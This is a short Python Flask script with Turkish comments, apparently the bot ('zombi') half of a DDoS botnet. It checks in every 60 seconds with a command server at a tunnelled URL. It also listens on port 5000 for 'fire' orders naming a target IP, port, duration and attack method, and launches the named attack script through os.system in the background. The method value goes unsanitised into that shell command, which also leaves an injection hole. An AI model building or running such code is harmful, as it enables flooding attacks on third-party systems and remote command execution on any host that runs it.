import os
import requests
import time
import threading
from flask import Flask, request

app = Flask(__name__)

# --- KRİTİK AYARLAR ---
# Playit'ten aldığın o sabit linki buraya yazıyorsun
BEYIN_URL = "http://usb-metallic.gl.joinmc.link" 
ZOMBI_PORT = "5000" # Zombi bu porttan emir bekleyecek

def kayit_ol():
    """Zombi açıldığında Beyin'e 'Ben buradayım' mesajı gönderir."""
    while True:
        try:
            # Beyin'in 8080 portuna (Playit üzerinden) kayıt isteği atar
            requests.get(f"{BEYIN_URL}/kayit?port={ZOMBI_PORT}", timeout=10)
        except:
            pass
        # 60 saniyede bir bağlantıyı tazeler
        time.sleep(60)

@app.route('/fire')
def fire():
    """Beyin'den gelen saldırı emrini yakalar."""
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    method = request.args.get('method')
    
    if method:
        # Method ismine göre scripti çalıştırır (örn: udp.py)
        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
        return f"Saldırı başladı: {method}", 200
    return "Method eksik", 400

@app.route('/ping')
def ping():
    return "PONG", 200

if __name__ == '__main__':
    # Kayıt işlemini arka planda başlat
    threading.Thread(target=kayit_ol, daemon=True).start()
    
    print(f"⚡ Zombi Aktif! Port {ZOMBI_PORT} dinleniyor...")
    app.run(host='0.0.0.0', port=int(ZOMBI_PORT))
